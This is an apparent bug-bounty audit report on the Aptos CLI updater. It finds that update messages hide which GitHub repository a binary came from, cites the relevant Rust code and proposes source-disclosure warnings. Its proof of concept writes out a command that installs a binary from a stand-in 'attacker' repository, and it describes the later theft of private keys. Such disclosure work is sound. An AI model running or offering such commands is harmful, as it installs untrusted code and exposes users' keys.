# Audit Report

## Title
CLI Update Transparency Vulnerability: Missing Repository Source Disclosure in Update Messages

## Summary
The `execute()` function in the Aptos CLI update tool fails to disclose the GitHub repository source (owner/name) in update success messages, allowing attackers to hide malicious update sources through social engineering attacks. Users can be tricked into installing backdoored binaries from attacker-controlled repositories with no indication in the output that they're downloading from a non-official source.

## Finding Description

The `execute()` function in `tool.rs` dispatches to various update tool implementations (AptosUpdateTool, RevelaUpdateTool, FormatterUpdateTool, etc.), each of which accepts user-controllable `--repo-owner` and `--repo-name` command-line arguments. [1](#0-0) [2](#0-1) [3](#0-2) 

However, the update success messages only display the tool name and version information, without indicating the repository source: [4](#0-3) 

An attacker can exploit this by:
1. Creating a malicious GitHub repository (e.g., `attacker/aptos-core`) containing backdoored binaries with valid version tags
2. Social engineering users to run: `aptos update aptos --repo-owner attacker --repo-name aptos-core`
3. The user sees: `"Successfully updated Aptos CLI from v2.4.0 to v2.5.0"` with no indication the binary came from `attacker/aptos-core` instead of the legitimate `aptos-labs/aptos-core`

The `build_updater` function constructs download URLs from these parameters without validation: [5](#0-4) 

## Impact Explanation

This vulnerability meets **Low Severity** criteria per the Aptos bug bounty program as a "minor information leak" - users are not informed about the actual source of their binary downloads. While the direct impact is information disclosure, the downstream consequence could be installation of malicious binaries leading to:
- Theft of private keys if the malicious CLI is used for wallet operations
- Compromise of developer machines
- Supply chain attacks on Move projects

However, this remains Low severity because:
- It requires explicit social engineering
- Users must actively provide malicious parameters
- Default values point to legitimate repositories
- Not an automatic or network-exploitable vulnerability

## Likelihood Explanation

**Likelihood: Medium-Low**

The attack requires:
1. Attacker to create convincing malicious GitHub repository with properly tagged releases
2. Social engineering to trick users (e.g., "Use this faster mirror: `aptos update aptos --repo-owner faster-mirror`")
3. User to execute the malicious command

While the technical bar is low (creating a GitHub repo is trivial), the social engineering component and requirement for explicit user action reduces likelihood. However, developers frequently copy-paste commands from online sources, making this more plausible than pure phishing.

## Recommendation

**Add repository source disclosure to update messages:**

Modify the success message in `crates/aptos/src/update/mod.rs` to include repository information:

```rust
let message = match result {
    Status::UpToDate(_) => unreachable!("We should have caught this already"),
    Status::Updated(_) => match info.current_version {
        Some(current_version) => format!(
            "Successfully updated {} from v{} to v{} (source: {}/{})",
            self.pretty_name(),
            current_version,
            info.target_version,
            self.repo_owner(),  // Add new trait method
            self.repo_name()    // Add new trait method
        ),
        None => {
            format!(
                "Successfully installed {} v{} (source: {}/{})",
                self.pretty_name(),
                info.target_version,
                self.repo_owner(),
                self.repo_name()
            )
        },
    },
};
```

Additionally, add a warning when non-default repositories are used:

```rust
if self.repo_owner() != self.default_repo_owner() || 
   self.repo_name() != self.default_repo_name() {
    eprintln!("⚠️  WARNING: Downloading from non-official repository: {}/{}", 
              self.repo_owner(), self.repo_name());
    eprintln!("⚠️  Official repository: {}/{}", 
              self.default_repo_owner(), self.default_repo_name());
}
```

## Proof of Concept

**Setup:**
1. Create a GitHub repository `attacker/aptos-core`
2. Create a release with tag `aptos-cli-v2.5.0` and upload a modified binary
3. Trick user into running the malicious command

**Exploitation:**
```bash
# Attacker provides this command to victim
aptos update aptos --repo-owner attacker --repo-name aptos-core --assume-yes

# Output (current behavior - no source indication):
# Successfully updated Aptos CLI from v2.4.0 to v2.5.0

# Victim has no idea they downloaded from attacker/aptos-core
# The malicious binary is now installed and will execute when used
```

**Verification:**
```bash
# After running the above command, check where the binary came from
# Currently impossible from CLI output alone

# Attacker's binary could exfiltrate private keys on next wallet operation:
aptos account fund-with-faucet --account 0xVICTIM_ADDRESS
# Malicious CLI sends private key to attacker-controlled server
```

**Notes:**
- This PoC demonstrates the transparency gap, not the full malware payload
- Actual exploitation requires social engineering users into using malicious parameters
- The vulnerability is the lack of source disclosure, enabling the attack

### Citations

**File:** crates/aptos/src/update/aptos.rs (L33-39)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,
```

**File:** crates/aptos/src/update/revela.rs (L27-33)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "verichains")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "revela")]
    repo_name: String,
```

**File:** crates/aptos/src/update/movefmt.rs (L27-33)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "movebit")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "movefmt")]
    repo_name: String,
```

**File:** crates/aptos/src/update/mod.rs (L58-76)
```rust
        let message = match result {
            Status::UpToDate(_) => unreachable!("We should have caught this already"),
            Status::Updated(_) => match info.current_version {
                Some(current_version) => format!(
                    "Successfully updated {} from v{} to v{}",
                    self.pretty_name(),
                    current_version,
                    info.target_version
                ),
                None => {
                    format!(
                        "Successfully installed {} v{}",
                        self.pretty_name(),
                        info.target_version
                    )
                },
            },
        };

```

**File:** crates/aptos/src/update/update_helper.rs (L67-77)
```rust
    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
```
